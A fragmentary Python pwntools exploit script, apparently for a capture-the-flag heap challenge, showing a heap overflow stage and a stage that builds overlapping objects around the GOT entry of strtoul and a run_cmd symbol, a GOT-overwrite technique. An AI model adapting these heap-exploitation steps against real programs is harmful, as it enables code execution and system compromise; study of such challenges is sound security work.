...
e       = ELF(binary_name)
run_cmd = pwn.p64(e.symbols['run_cmd'])
...
def stage_2_create_and_shrink(target):
    ...
    edit_boot(target, 0, 0x70*b'A'+ pwn.p64(0x200)) #overflow
    #edit_boot(target, 0, 0x100*'A')# + pwn.p64(0x0A)) #overflow
    #delete_boot(target, 0)
...
def stage_5_create_overlapping_object(target):
    ...
    addr_strtoul    = pwn.p64(e.got['strtoul'])
    addr_runcmd     = pwn.p64(e.symbols['run_cmd'])
